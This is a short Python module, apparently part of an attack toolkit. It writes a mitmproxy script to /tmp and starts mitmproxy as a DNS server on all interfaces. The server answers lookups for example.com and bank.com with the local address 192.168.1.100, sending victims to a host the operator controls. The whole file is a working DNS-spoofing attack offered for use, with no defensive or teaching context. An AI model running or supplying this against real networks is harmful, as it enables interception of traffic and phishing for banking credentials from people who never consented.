#!/usr/bin/env python3
"""
dns_spoof.py - DNS spoofing with mitmproxy
"""

import subprocess
from .utils import setup_logging

logger = setup_logging("dns_spoof")

DNS_SPOOF_SCRIPT = """
from mitmproxy import dns

def request(flow: dns.DNSFlow) -> None:
    if flow.request and flow.request.question:
        qname = flow.request.question.name
        spoofed_domains = {
            b"example.com.": "192.168.1.100",
            b"bank.com.": "192.168.1.100",
        }
        if qname in spoofed_domains:
            flow.response = dns.make_response(flow.request)
            flow.response.answer = [
                dns.RR(qname, "A", 300, spoofed_domains[qname])
            ]
"""

def start_dns_spoof(interface=None, port=53):
    script_path = "/tmp/dns_spoof.py"
    with open(script_path, "w") as f:
        f.write(DNS_SPOOF_SCRIPT)
    cmd = [
        "mitmproxy",
        "--mode", f"dns@:{port}",
        "-s", script_path,
        "--set", "dns_listen_address=0.0.0.0"
    ]
    if interface:
        cmd.extend(["--set", f"iface={interface}"])
    logger.info(f"Starting DNS spoofing on port {port}")
    logger.info("Press Ctrl+C to stop")
    subprocess.run(cmd)